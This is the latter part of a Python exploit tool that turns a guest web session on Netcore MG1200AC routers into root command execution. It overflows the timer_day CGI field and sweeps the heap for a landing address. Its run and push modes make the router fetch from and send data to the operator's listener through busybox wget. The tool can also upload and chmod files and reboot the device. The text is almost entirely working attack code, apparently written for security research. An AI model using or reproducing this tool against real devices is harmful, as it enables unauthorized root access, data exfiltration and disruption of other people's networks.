            except OSError:
                break
            if not d:
                break
            buf += d
        line = buf.split(b'\r\n', 1)[0]
        with self.lock:
            self.seen.append(line.decode('latin1')[:160])
        body = b''
        words = line.split(b' ')
        target = ''
        if len(words) > 1 and words[0] == b'GET':
            # the payload can hold spaces, so the request line is not three
            # words: everything between `GET ` and the final ` HTTP/1.1` is what
            # the device sent
            head, tail = buf.find(b'GET '), buf.rfind(b' HTTP/1.1')
            if 0 <= head < tail:
                target = buf[head + 4:tail].decode('latin1')
        pre = f'/{self.token}'
        if target.startswith(pre):
            rest = target[len(pre):]
            if rest.startswith('up/'):
                with self.lock:
                    body = self.files.get(rest[3:], b'')
            elif rest.startswith('?'):
                key, _, payload = rest[1:].partition('?')
                with self.lock:
                    self.got[key] = payload
        try:
            c.sendall(b''.join([
                b'HTTP/1.1 200 OK\r\nContent-Length: ',
                str(len(body)).encode(),
                b'\r\nConnection: close\r\n\r\n', body]))
        except OSError:
            pass
        c.close()

    def wait(self, key: str, timeout: float = 1.0) -> str | None:
        """The payload that arrived under `key`, or None after `timeout`
        seconds."""
        t0 = time.time()
        while time.time() - t0 < timeout:
            with self.lock:
                if key in self.got:
                    return self.got.pop(key)
            time.sleep(0.05)
        return None

    def close(self) -> None:
        self.stop.set()


FIRE_ROUNDS = 4
'passes over the known aims; each miss costs a CGI child'
AIM_TRIES = 3
'shots per aim: the carrier is two-valued (README §6.3)'


def fire(
        s: Session, cfg: Cfg, line: str, dial: Dial, key: str,
        quiet: bool = False, first: float = 2.0) -> str | None:
    """Send one payload that must connect back to us, and wait for *arrival*
    under `key`: the arrival is the proof, so no latency gate and no cost
    for a slow command. Rounds are capped because every miss costs a CGI
    child (README §6.3, §7.2).

    `first` is how long to give that first shot, and it has to cover the whole
    command line: the listener answers a request only once the device stops
    sending, so a chain that dials back twice needs ~3 * DIAL_READ - otherwise
    a working push looks like a miss and each retry re-pushes the file."""
    blob = cmd_blob(pad_cmd(ifs(line)), cfg['anchor'])
    tmo = cfg.get('timeout') or REQ_TIMEOUT
    for rnd in range(FIRE_ROUNDS):
        for aim in cfg['aims']:
            s.shot(blob, cfg['pad'], aim, timeout=tmo)
            got = dial.wait(key, first if rnd == 0 else 0.5)
            if got is not None:
                return got
        if not quiet:
            print(f'  no dial-out yet (round {rnd + 1}/{FIRE_ROUNDS})')
    return None


def run_command(
        s: Session, cfg: Cfg, cmd: bytes, dial: Dial | None = None,
        quiet: bool = False, secs: int = 0,
        pattern: str | None = None) -> str | None:
    """Run `cmd` as root and return its output: one request that writes a
    file, dials it back and removes it, with no `sleep` anywhere. With
    `pattern` it is instead one gated request answering "does a line
    start with this pattern" (README §7.1, §7.2)."""
    path = tmp_for(f'{random.randrange(1 << 24):06x}')
    # The group is what captures a `a; b`, and `)` stays flush against `>`;
    # stdout only, because `2>&1` cannot be sent at all (README §6.4, §7.2).
    form = f'({cmd.decode()})>{path}'
    if pattern:
        # the `sleep` must hang off `grep`, and the `rm` must come after it:
        # `...; grep -q pat p; rm -f p && sleep N` gates on `rm`, which always
        # succeeds, so it answers "did the payload run" for any pattern
        # whatsoever (README §7.1)
        ask = f'grep -q "^{pat_clean(pattern)}" {path}'
        blob = cmd_blob(
            pad_cmd(ifs(f'{form};{ask}&&sleep {secs};rm -f {path}')),
            cfg['anchor'])
        ok, dt, _ = delayed(s, cfg, blob, gate_slow(secs), quiet)
        if not quiet:
            # one request answers one bit, and "no delay" cannot say which half
            # failed: the payload never landed, or it landed and grep disagreed
            # (README §7.1)
            if ok:
                print(f'  {dt:.2f}s, matched: {pattern!r}')
            else:
                print(f'  no delay, did not match: {pattern!r}')
        return pattern if ok else ''

    if dial is None:
        raise SystemExit(
            '[!] `run` needs a listener for the whole output; pass '
            '--lhost/--lport or use --grep')
    # the substitution stays quoted: unquoted, the file's own spaces
    # word-split the URL and wget sees only its first word (README §7.2)
    q = '"'
    url = dial.url(f'?r?{q}$(cat {path}){q}')
    out = fire(
        s, cfg, f'{form};busybox wget -q -O{path}.r {url};'
        f'rm -f {path} {path}.r', dial, 'r', quiet=quiet)
    if out is None:
        print(
            '[!] the device never dialed out. That is the request failing, not '
            f'a slow command: the target must be able to route to {dial.host} '
            '(never 127.0.0.1), and nothing else should hold the port. '
            '`--grep` reads one bit through the gate without any dial-out '
            '(README §7.1, §7.2)')
    return out


def push_file(
        s: Session, cfg: Cfg, dial: Dial, local: str, remote: str,
        mode: str = '', quiet: bool = False) -> int | None:
    """Copy a file onto the target and report the size it ended up with (§7.2).

    The bytes travel in the HTTP *response*, so this is binary-safe: no
    shell, no NUL problem, no encoding. The device confirms by dialing
    back `wc -c` of the result."""
    with open(local, 'rb') as f:
        data = f.read()
    for name, val in (('remote path', remote), ('mode', mode)):
        # check the raw value: ifs() turns a space into ${IFS}, which is clean,
        # so validating after the rewrite lets a real space through - and the
        # space goes into the command line as it stands, where it splits the
        # arguments (README §7.2)
        if any(b in BAD for b in val.encode()):
            raise SystemExit(
                f'[!] the {name} contains a byte that cannot travel in a form '
                f'value (space, tab, newline): {val!r}')
    lines = [f'busybox wget -q -O{remote} {dial.hand(data)}']
    if mode:
        lines.append(f';chmod {mode} {remote}')
    # quote it: `wc -c` pads its number with spaces, and an unquoted
    # substitution would split them out of the URL argument (README §7.2)
    q = '"'
    lines.append(
        f';busybox wget -q -O{remote}.d '
        f'{dial.url(f"?p?{q}$(wc -c <{remote}){q}")}')
    # and the receipt is a temporary file too (README §10)
    lines.append(f';rm -f {remote}.d')
    got = fire(
        s, cfg, ''.join(lines), dial, 'p', quiet=quiet, first=3 * DIAL_READ)
    size = int(got.strip()) if got and got.strip().isdigit() else None
    if size == 0 and not quiet:
        # the fetch produced an empty file: show what the device actually asked
        # for
        for seen in dial.seen:
            print(f'    device requested: {seen!r}')
    if size is not None and size != len(data):
        print(f'  [!] target holds {size} B, source is {len(data)} B')
    return size


def best_lhost(rhost: str) -> str:
    """The local address the kernel would route to rhost from, whatever the
    interface is named - i.e. the one the target can actually reach,
    since it dials back to us."""
    c = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        c.connect((rhost, 80))
        return str(c.getsockname()[0])
    except OSError:
        return '0.0.0.0'
    finally:
        c.close()


def free_port(lhost: str) -> int:
    c = socket.socket()
    c.bind((lhost if lhost != '0.0.0.0' else '', 0))
    p = int(c.getsockname()[1])
    c.close()
    return p


# ------------------------------------------------------- reboot fingerprint --
INFO_ENTRY = '/web360/getrouterinfo.cgi'
r'boa: ^/web360/\w+\.cgi$ -> /web/web360/n360.cgi'
BOOT_SLACK = 10
'seconds of tolerance on the boot fingerprint'


def router_info(s: Session, timeout: int) -> dict[str, object] | None:
    """The device's own status CGI, reached over the same session as the
    exploit: an ordinary request, so it is the cheap way to read `uptime`
    (README §7.2). A refused session re-logins once, like `shot`."""
    for attempt in range(2):
        req = urllib.request.Request(
            f'http://{s.rhost}{INFO_ENTRY}', data=b'',
            headers={
                'token_id': s.tok,
                'Content-Type': 'application/x-www-form-urlencoded'})
        s.plain += 1
        try:
            with s.op.open(req, timeout=timeout) as f:
                body = f.read()
        # urllib errors are OSErrors
        except OSError as e:
            print(f'  [!] {INFO_ENTRY} not answered: {e}')
            return None
        if b'<head>' in body:
            if attempt:
                return None
            s.relogin()
            continue
        try:
            obj = _obj(json.loads(body))
        except ValueError:
            print(f'  [!] {INFO_ENTRY} answered no JSON: {body[:60]!r}')
            return None
        data = _obj(obj.get('data')) if obj else None
        if not obj or not data or obj.get('err_no') not in ('0', 0):
            return None
        return data
    return None


ROM_SIG = {'v107': 'V1.0.7', 'v127': 'V1.2.7', 'sh121': 'SH-V1.2.1'}
"""what each preset's firmware prints as its version, which is how the device
identifies itself to us (README §8)"""


def rom_for(version: str) -> str | None:
    """The preset whose image reports this version string.

    The device states which firmware it runs, so a pad that is not this box's
    need never be swept: trying presets in order costs a whole heap sweep per
    wrong guess (README §6.3), and the version string is one read-only request
    that settles it."""
    for key, sig in ROM_SIG.items():
        if sig in version:
            return key
    return None


def boot_instant(info: dict[str, object]) -> int | None:
    """The host epoch this device booted at, from its uptime and our clock.
    BOOT_SLACK is how far it may drift and still be the same boot."""
    try:
        up = int(str(info.get('uptime')))
    except (TypeError, ValueError):
        return None
    return int(time.time() - up)


def reboot(s: Session, cfg: Cfg, secs: int) -> bool:
    """Reboot through the exploit: prove the command, fire it, and stop.

    `test -x /sbin/reboot` is the gate, so the one delayed answer proves both
    halves of what `reboot` means: this payload really executes, and the command
    it would execute is there. Nothing is verified after firing - a device that
    reboots stops answering, its session table goes with it, and reading
    anything back would need the credential this tool never defaults. The box
    coming back is the operator's observation, not ours (README §9)."""
    ok, dt, _ = gated(s, cfg, ifs('test -x /sbin/reboot'), secs)
    if not ok:
        print(
            f'[!] `test -x /sbin/reboot` did not delay ({dt:.2f}s): this '
            'payload is not executing it, so nothing was fired')
        return False
    print(f'  /sbin/reboot is executable ({dt:.2f}s), firing it')
    # no gate on this one, and no reading of the answer: the box stops
    # answering the moment it works. One shot at each aim the carrier is known
    # to alternate between (README §6.3)
    blob = cmd_blob(pad_cmd(ifs('/sbin/reboot')), cfg['anchor'])
    for aim in cfg.get('aims') or [cfg['aim']]:
        s.shot(
            blob, cfg['pad'], aim,
            timeout=cfg.get('timeout', REQ_TIMEOUT))
    print('[+] reboot fired; check the device now')
    return True


class Cache(TypedDict):
    at: int
    shape: list[int]
    aims: list[int]
    pad: int
    anchor: list[object]
    # the whole web session rides with the constants: token *and* the cookies
    # it is keyed on. That is a bearer credential, hence the 0600 file and the
    # re-login on refusal.
    tok: NotRequired[str]
    cookies: NotRequired[dict[str, str]]
    # which web user that token belongs to: a session is not shared across
    # --user values
    user: NotRequired[str]
    # the boot instant the aims were measured against (README §7.2)
    boot: NotRequired[int]


def cache_default() -> str:
    """In the temp dir on purpose: the cached aims are only valid for one boot of
    the *device* (README §7.2), so a host reboot should take them with it rather
    than leaving a stale pair to be re-proved. The name carries the uid because
    that dir is world-writable."""
    base = os.environ.get('TMPDIR') or tempfile.gettempdir()
    return os.path.join(base, f'mg1200ac_run.{os.getuid()}.cache')


def _obj(value: object) -> dict[str, object] | None:
    return cast(dict[str, object], value) if isinstance(value, dict) else None


def _int(value: object) -> int | None:
    if isinstance(value, int) and not isinstance(value, bool):
        return value
    return None


def _ints(value: object) -> list[int] | None:
    """A non-empty list of ints, or nothing: decoded JSON is `object` to us."""
    if not isinstance(value, list):
        return None
    out: list[int] = []
    for item in cast(list[object], value):
        n = _int(item)
        if n is None:
            return None
        out.append(n)
    return out or None


def _anchor(value: object) -> core.Anchor | None:
    if not isinstance(value, list):
        return None
    items = cast(list[object], value)
    if len(items) != 3:
        return None
    kind, addr, sym = items
    if not isinstance(kind, str) or not isinstance(sym, str):
        return None
    # `abs` and `gp` are the only shapes code_cmd knows; a typo would otherwise
    # be encoded as a $gp displacement and miss forever with no clue why
    if kind not in ('abs', 'gp'):
        return None
    n = _int(addr)
    return None if n is None else (kind, n, sym)


def cfg_of(cache: Cache, timeout: int) -> Cfg:
    """What an earlier run measured, as a configuration (README §7.2)."""
    aims = cache['aims']
    return {
        'pad': cache['pad'],
        'anchor': cast(core.Anchor, tuple(cache['anchor'])),
        'aim': aims[0], 'aims': aims, 'timeout': timeout}


def cache_entry(path: str, rhost: str) -> dict[str, object]:
    """One device's entry in the cache file, or nothing."""
    try:
        with open(path, encoding='utf-8') as f:
            stored = _obj(json.load(f))
    except (OSError, ValueError):
        return {}
    return (_obj(stored.get(rhost)) if stored else None) or {}


def cache_load(path: str, rhost: str) -> Cache | None:
    """A previous run's landing points: trusted only while the payload
    geometry is unchanged, only for CACHE_AGE seconds, and otherwise only under
    a matching boot instant (README §6.3, §7.2). A run that drops its aims keeps
    the entry's session, which is what `cache_session` reads."""
    entry = cache_entry(path, rhost)
    at, pad = _int(entry.get('at')), _int(entry.get('pad'))
    aims, shape = _ints(entry.get('aims')), _ints(entry.get('shape'))
    anchor = _anchor(entry.get('anchor'))
    if at is None or pad is None or aims is None or shape is None or \
            anchor is None:
        return None
    if shape != [SLED, SIZE, COARSE] or time.time() - at > CACHE_AGE:
        return None
    out: Cache = {
        'at': at, 'shape': shape, 'aims': aims, 'pad': pad,
        'anchor': list(anchor)}
    boot = _int(entry.get('boot'))
    if boot is not None:
        out['boot'] = boot
    return out


def cache_session(
        path: str, rhost: str, user: str) -> tuple[str, dict[str, str]]:
    """The cached login, readable on its own: an entry whose aims were dropped
    still carries a token and cookies worth reusing, so no credential is spent.
    Only for the user it was cached under - a token is that session, not a
    global one."""
    entry = cache_entry(path, rhost)
    if entry.get('user') != user:
        return '', {}
    tok = entry.get('tok')
    raw = entry.get('cookies')
    cookies: dict[str, str] = {}
    if isinstance(raw, dict):
        for k, v in cast(dict[object, object], raw).items():
            if isinstance(k, str) and isinstance(v, str):
                cookies[k] = v
    return (tok if isinstance(tok, str) else ''), cookies


def load_constants(path: str) -> core.Preset:
    """Pads and anchors written by `mg1200ac_rom.py -o` - the way to point this
    chain at a firmware that is not in ROMS without the runner ever inspecting a
    filesystem."""
    try:
        with open(path, encoding='utf-8') as f:
            stored = _obj(json.load(f))
    except (OSError, ValueError) as e:
        raise SystemExit(f'[!] cannot read constants from {path}: {e}')
    if not stored:
        raise SystemExit(f'[!] {path} is not a constants object')
    pads = _ints(stored.get('pads')) or []
    raw = stored.get('anchors')
    anchors: list[core.Anchor] = []
    if isinstance(raw, list):
        for item in cast(list[object], raw):
            a = _anchor(item)
            if not a:
                raise SystemExit(
                    f'[!] {path}: bad anchor {item!r}, want '
                    '["abs"|"gp", address, symbol]')
            anchors.append(a)
    if not pads and not anchors:
        raise SystemExit(f'[!] {path} holds neither pads nor anchors')
    return {'pads': pads, 'anchors': anchors}


def cache_write(path: str, rhost: str, entry: Cache) -> None:
    """Merge one device's entry into the cache file - it covers several devices,
    and it holds a bearer credential, hence 0600."""
    try:
        with open(path, encoding='utf-8') as f:
            alls = _obj(json.load(f)) or {}
    except (OSError, ValueError):
        alls = {}
    alls[rhost] = dict(entry)
    try:
        os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
        # O_NOFOLLOW + the mode at creation: in a world-writable directory a
        # symlink planted at this path would otherwise send the bearer
        # credential into whoever asks for it.
        fd = os.open(
            path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW, 0o600)
        with os.fdopen(fd, 'w', encoding='utf-8') as f:
            json.dump(alls, f, indent=1)
        os.chmod(path, 0o600)
    except OSError as e:
        print(f'  [!] cache not written: {e}')


def cache_save(
        path: str, rhost: str, cfg: Cfg, s: Session | None = None,
        boot: int | None = None) -> None:
    """Keep what was measured, not what was configured on this command line, so
    a later run may skip both the sweep and the calibration; the boot instant
    rides along."""
    kind, addr, sym = cfg['anchor']
    entry: Cache = {
        'at': int(time.time()), 'shape': [SLED, SIZE, COARSE],
        'aims': list(cfg.get('aims') or [cfg['aim']]), 'pad': cfg['pad'],
        'anchor': [kind, addr, sym]}
    if boot is not None:
        entry['boot'] = boot
    if s is not None and s.tok:
        entry['tok'] = s.tok
        entry['cookies'] = s.cookies()
        entry['user'] = s.user
    cache_write(path, rhost, entry)


def cache_forget_landing(path: str, rhost: str) -> None:
    """Keep only the session: a dial-out that never arrived disproved the aims,
    not the login that carried them."""
    entry = cache_entry(path, rhost)
    keep = {k: v for k, v in entry.items() if k in ('tok', 'cookies', 'user')}
    if keep and keep != entry:
        cache_write(path, rhost, cast(Cache, keep))


def drop_cached_aims(path: str, rhost: str, fast: bool, what: str) -> None:
    """A fast-path request that never dialed back disproved exactly one thing:
    the cached aims. Drop them (README §7.2). A measured path has just proven
    its aims, so it keeps them."""
    if not fast:
        return
    cache_forget_landing(path, rhost)
    print(
        f'  [!] {what}: the cached aims are dropped (the session is kept), so '
        'the next run calibrates and sweeps again')


def proof(s: Session, cfg: Cfg, secs: int) -> bool:
    ok, dt, _ = gated(s, cfg, ifs('kill -0 999999'), secs)
    ctl = 'ok' if not ok else '!!'
    print(
        f'[{ctl}] control: kill -0 <nonexistent pid> did not delay ({dt:.2f}s)')
    ok1, dt1, _ = gated(s, cfg, ifs('kill -0 1'), secs)
    tag1 = 'PASS' if ok1 else 'FAIL'
    print(
        f'[{tag1}] root-only action delayed {dt1:.2f}s: uid 0 command '
        'execution')
    ok2, dt2, _ = gated(
        s, cfg, ifs('grep -q "Uid:[^0-9]*0" /proc/self/status'), secs)
    tag2 = 'PASS' if ok2 else 'FAIL'
    print(f'[{tag2}] the CGI child reads itself as uid 0 ({dt2:.2f}s)')
    return ok1 and ok2 and not ok


def build_presets(
        args: argparse.Namespace,
        version: str) -> tuple[list[int], list[core.Anchor]]:
    """The constants this run is allowed to try: command-line flags first, then
    a derived file, then the built-in preset for the firmware the *device*
    reports. Nothing here inspects a firmware image, and nothing guesses: a
    version this tool does not know stops the run, because the alternative is
    a whole heap sweep per wrong pad (README §7.2, §8, §9)."""
    presets: list[core.Preset] = []
    if args.pad or args.got:
        presets.append({
            'pads': [args.pad] if args.pad else [],
            'anchors': [('abs', args.got, args.got_sym)] if args.got else []})
    if args.constants:
        presets.append(load_constants(args.constants))
    if args.rom == 'auto':
        key = rom_for(version)
        if key:
            print(
                f'[+] the device reports {version}: pad and anchor come from '
                'that signature alone, with no other pad to sweep')
            order = [key]
        elif presets:
            # the operator named the constants; nothing is left to guess at
            order = []
        else:
            raise SystemExit(
                f'[!] the device reports {version or "no version at all"}, '
                'which matches none of the known signatures '
                f'({", ".join(ROM_SIG.values())}). Derive the firmware with '
                'mg1200ac_rom.py and pass --constants, or name a known image '
                'with --rom')
    else:
        order = [args.rom]
        if version and rom_for(version) != args.rom:
            print(
                f'  [!] --rom {args.rom} overrides what the device reports '
                f'({version}): a pad tried in error costs a whole heap sweep')
    presets += [ROMS[k] for k in order]
    pads: list[int] = []
    anchors: list[core.Anchor] = []
    for p in presets:
        pads += p['pads']
        anchors += p['anchors']
    pads = list(dict.fromkeys(pads))
    anchors = list(dict.fromkeys(anchors))
    if not pads or not anchors:
        # both halves are needed and neither may be guessed: a missing pad here
        # would become one heap sweep per candidate
        raise SystemExit(
            f'[!] {"no pad distance" if not pads else "no libc GOT anchor"} '
            'is known for this firmware: derive it with mg1200ac_rom.py and '
            'pass --constants, or pass --pad/--got/--got-sym directly')
    return pads, anchors


def main() -> int:
    parser = argparse.ArgumentParser(
        description='guest web session -> uid 0 on any stock Netcore MG1200AC '
        'firmware',
        epilog='The device only ever sees bounded requests '
        '(--max-requests/--max-sweeps); nothing is written outside the run '
        'cache.')
    parser.add_argument(
        '--rhost', default='192.168.0.1', metavar='IP',
        help='device web address (default: %(default)s)')
    parser.add_argument(
        '--user', default=SAMPLE_USER,
        help='web login name (default: %(default)s)')
    parser.add_argument(
        '--password', default='',
        help='web login password - only needed when no session token is cached '
        'or the device has stopped accepting it')

    fw = parser.add_argument_group('firmware constants')
    fw.add_argument(
        '--rom', default='auto', choices=['auto', *ROMS],
        help='restrict to one known image. The default auto asks the device '
        'which firmware it runs and uses only that signature; a version it '
        'cannot match stops the run, because guessing a pad costs a whole heap '
        'sweep per wrong guess')
    fw.add_argument(
        '--constants', metavar='FILE',
        help='JSON written by mg1200ac_rom.py, for a firmware this script does '
        'not know')
    fw.add_argument(
        '--pad', type=int, metavar='N',
        help='bytes of timer_day before the saved $ra')
    fw.add_argument(
        '--got', type=int, metavar='ADDR',
        help='GOT slot of the CGI host that holds a resolved libc pointer')
    fw.add_argument(
        '--got-sym', default='memset', choices=sorted(core.LIBC),
        metavar='SYM', help='which libc symbol --got points at '
        '(default: %(default)s)')
    fw.add_argument(
        '--addr', type=lambda s: int(s, 0), metavar='A',
        help='skip the heap sweep and use this landing address')
    fw.add_argument(
        '--lo', type=lambda s: int(s, 0), default=HEAP_LO,
        metavar='A', help='sweep window start (default: %(default)s)')
    fw.add_argument(
        '--hi', type=lambda s: int(s, 0), default=HEAP_HI,
        metavar='A', help='sweep window end (default: %(default)s)')
    fw.add_argument(
        '--cache', metavar='PATH',
        help='run cache holding the measured aims, pad, anchor, the boot '
        'instant they were measured against, and the session token with its '
        f'user (default: {cache_default()}; honours $TMPDIR, written 0600, and '
        'a host reboot clears it)')
    fw.add_argument(
        '--no-cache', action='store_true',
        help='ignore and do not write the cache: forces a sweep, a login and '
        'a calibration on every mode')

    out = parser.add_argument_group('output')
    out.add_argument(
        '--lhost',
        help='address the device dials back to (default: whichever local '
        'address this host routes to --rhost through, so it is on the target '
        'network whatever the interface is called; 127.0.0.1 can never work). '
        'Only `run` without --grep and `push` use it')
    out.add_argument(
        '--lport', type=int, default=0,
        help='port for that listener (default 0: the OS picks a free one at '
        'run time)')
    out.add_argument(
        '--grep', metavar='PATTERN',
        help='with run: ask the gate the single bit "does a line of the output '
        'match this BRE" instead of dialing the whole file back - no listener '
        'needed, one request')
    out.add_argument(
        '--chmod', default='', metavar='OCTAL',
        help='with push: chmod the pushed file to this mode (e.g. 755)')
    out.add_argument(
        '--secs', type=int, default=0, metavar='N',
        help='seconds of sleep that mark a successful gated command; the '
        'default 0 measures the gate against this device\'s own read-only '
        'request latency, and only the gate paths use it')

    parser.add_argument(
        '-q', '--quiet', action='store_true',
        help='one line per phase')
    parser.add_argument(
        '-t', '--timeout', type=int, default=REQ_TIMEOUT,
        help='per-request timeout in seconds (default: %(default)s)')
    parser.add_argument(
        '--max-requests', type=int, default=MAX_SHOTS,
        metavar='N', help='stop after this many requests: every miss crashes '
        'a CGI child, so a shared device is protected from a runaway sweep '
        '(default: %(default)s)')
    parser.add_argument(
        '--max-sweeps', type=int, default=MAX_SWEEPS,
        metavar='N', help='full heap sweeps allowed per run; a sweep is ~180 '
        'crashing requests (default: %(default)s)')
    parser.add_argument(
        '--yes', action='store_true',
        help='confirm a destructive mode')
    parser.add_argument(
        'mode', choices=['check', 'sweep', 'run', 'push', 'reboot'],
        help='check: locate, negotiate and prove uid 0; sweep: locate and '
        'print the constants only; run: execute a command and return its '
        'output; push: copy <LOCAL> <REMOTE> onto the device; reboot: reboot '
        'through the exploit (needs --yes)')
    parser.add_argument(
        'targets', nargs='*', metavar='ARG',
        help='run: the command line (it runs as root, must not redirect '
        'its own output, and must exist on the firmware under test - the stock '
        'applet set has no id, nc or httpd, README §4.7); push: '
        '<LOCAL> <REMOTE>')

    args = parser.parse_args()
    if args.mode == 'reboot' and not args.yes:
        parser.error(
            'reboot disrupts the device and anything else using it; pass --yes')
    if args.grep and args.mode != 'run':
        parser.error('--grep only means something with `run`')
    if args.secs < 0:
        parser.error('--secs takes 0 (measure the gate) or a positive number')
    if args.mode == 'run' and not args.targets:
        parser.error('run needs a command, e.g. run "cat /proc/version"')
    if args.mode == 'push':
        if len(args.targets) != 2:
            parser.error('push needs exactly <LOCAL> <REMOTE>')
        if not os.path.isfile(args.targets[0]):
            parser.error(f'no such local file: {args.targets[0]}')

    cache_path = args.cache or cache_default()
    cache = None if args.no_cache or args.addr else cache_load(
        cache_path, args.rhost)
    args.lhost = args.lhost or best_lhost(args.rhost)
    if args.lhost == '0.0.0.0' and args.mode in ('run', 'push') \
            and not args.grep:
        # the listener would bind everywhere but the URL it advertises is
        # 0.0.0.0, which no device can connect back to
        print(
            f'[!] this host has no route to {args.rhost}, so the dial-back '
            'address is unknown: pass --lhost with an address the device can '
            'reach, or read one bit with `run --grep` instead')
    if not args.lport:
        args.lport = free_port(args.lhost)
    # read separately: an entry can hold a session without aims, and dropping
    # the aims must not cost a credential
    warm, warm_cookies = ('', {}) if args.no_cache else cache_session(
        cache_path, args.rhost, args.user)
    s = Session(
        args.rhost, args.user, args.password, args.max_requests,
        args.max_sweeps, token=warm, cookies=warm_cookies or None)
    hint = '' if args.password else \
        ' (no password given: using the cached token)'
    print(f'[+] {args.rhost} as {args.user}{hint}')

    # one ordinary status request answers both questions worth asking before
    # any traffic: which firmware this is, so a wrong pad is never swept, and
    # when it booted, so measured aims can be reused. Sent with --no-cache too:
    # reading it costs one request, skipping it costs a heap sweep per pad
    info = router_info(s, args.timeout)
    version = str(info.get('version') or '') if info else ''
    boot = boot_instant(info) if info and not args.no_cache else None
    pads, anchors = build_presets(args, version)

    cfg: Cfg | None = None
    # the gate every latency verdict in this run shares. 0 = not measured yet:
    # it stays unmeasured on the arrival-confirmed fast path, which reads no
    # latency at all (README §6.4)
    secs = args.secs
    fast = False
    if cache:
        aim_list = ', '.join(f'{a:#x}' for a in cache['aims'])
        # run/push confirm by arrival, so a matching boot is all they need to
        # fire straight at the cached aims (README §7.2)
        cb = cache.get('boot')
        same_boot = boot is not None and cb is not None and \
            abs(boot - cb) <= BOOT_SLACK
        if boot and same_boot and not args.grep and \
                args.mode in ('run', 'push'):
            cfg, fast = cfg_of(cache, args.timeout), True
            print(
                f'[+] reused {cache_path}: aims {aim_list}, '
                f'pad {cache["pad"]}, anchor {core.describe(cfg["anchor"])}; '
                f'still {int(time.time()) - boot} s into the same boot those '
                f'aims were measured against')
        else:
            # the latency paths need their gate and their threshold measured
            # here, because their verdict is a latency
            secs = measure_gate(s, args.timeout, secs, args.quiet)
            calibrate(s, cache['pad'], args.quiet, args.timeout)
            cfg = negotiate(
                s, cache['aims'], [cache['pad']],
                [cast(core.Anchor, tuple(cache['anchor']))], secs, args.quiet,
                timeout=args.timeout)
            if cfg:
                print(
                    f'[+] reused {cache_path}: aims {aim_list}, '
                    f'pad {cache["pad"]}, '
                    f'anchor {core.describe(cfg["anchor"])} (no sweep)')
            elif not args.quiet:
                print(
                    '  [!] cached aims no longer land; sweeping for a fresh '
                    'carrier')
    if cfg is None:
        secs = measure_gate(s, args.timeout, secs, args.quiet)
        for pad in pads:
            # a wrong pad never hijacks $ra, so each pad needs its own sweep
            _miss, slow = calibrate(s, pad, args.quiet, args.timeout)
            aims = [args.addr] if args.addr else locate(
                s, pad, slow, args.lo, args.hi, args.quiet,
                timeout=args.timeout)
            if not args.addr:
                found = ', '.join(f'{a:#x}' for a in aims) or 'no landing'
                print(
                    f'[+] sweeping {args.lo:#010x}..{args.hi:#010x} for the '
                    f'carrier (pad {pad}) -> {found}')
            if not aims:
                continue
            cfg = negotiate(
                s, aims, [pad], anchors, secs, args.quiet,
                timeout=args.timeout)
            if cfg:
                break
    if cfg is None:
        print(
            '[!] nothing landed and took over $ra in that window: either the '
            'CGI host is PIE (README §1.3, §11.1) or the overflow distance is '
            'not in the presets - derive it with mg1200ac_rom.py, or pass '
            '--pad/--constants/--lo/--hi')
        return 1
    # store even what --addr supplied: negotiate had to see it land twice
    # before getting here, so the cache still holds only measured aims - and a
    # session that had to re-login mid-run is written back for the next time
    if not args.no_cache:
        cache_save(cache_path, args.rhost, cfg, s, boot)
    print(
        f'[+] firmware constants: pad {cfg["pad"]}, '
        f'anchor {core.describe(cfg["anchor"])}, aim {cfg["aim"]:#010x}')

    dial: Dial | None = None
    try:
        if args.mode == 'sweep':
            code = 0
        elif args.mode == 'reboot':
            code = 0 if reboot(s, cfg, secs) else 1
        elif args.mode == 'check':
            code = 0 if proof(s, cfg, secs) else 1
        elif args.mode == 'push':
            local, remote = args.targets
            dial = Dial(args.lhost, args.lport)
            size = push_file(
                s, cfg, dial, local, remote, args.chmod, quiet=args.quiet)
            if size is None:
                code = 1
                drop_cached_aims(
                    cache_path, args.rhost, fast,
                    'the pushed file was never dialed back')
            else:
                src = os.path.getsize(local)
                verdict = 'MATCH' if size == src else f'MISMATCH, {src} B here'
                print(
                    f'[+] pushed {local} -> {remote}: {size} B on the target '
                    f'({verdict})')
                code = 0 if size == src else 1
        else:
            dial = None if args.grep else Dial(args.lhost, args.lport)
            if dial:
                print(f'  dial-back listener on {dial.host}:{dial.port}')
            text = run_command(
                s, cfg, sanitize_cmd(' '.join(args.targets)), dial=dial,
                quiet=args.quiet, secs=secs, pattern=args.grep)
            if text is None:
                code = 1
                if not args.grep:
                    drop_cached_aims(
                        cache_path, args.rhost, fast,
                        'the device never dialed back')
            elif args.grep:
                print(
                    f'[+] output {("matches" if text else "does not match, "
                                  "or the payload did not land")} '
                    f'{args.grep!r}')
                code = 0 if text else 1
            elif not text:
                print('[+] the command produced no output')
                code = 0
            else:
                print(f'[+] {len(text)} B dialed back:')
                print(text)
                code = 0
    finally:
        if dial:
            dial.close()
        # one honest traffic figure: `shots` is what crashes a CGI child, the
        # rest is ordinary web traffic this run added on top of it
        print(
            f'[+] {s.shots + s.plain + 2 * s.logins} request(s) to '
            f'{args.rhost}: {s.shots} exploit, {s.plain} plain, '
            f'{2 * s.logins} login, {s.sweeps} sweep(s)')
    return code


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        # a sweep is a long series of crashing requests: stopping must not look
        # like a tool failure
        print('\n[!] interrupted')
        sys.exit(130)
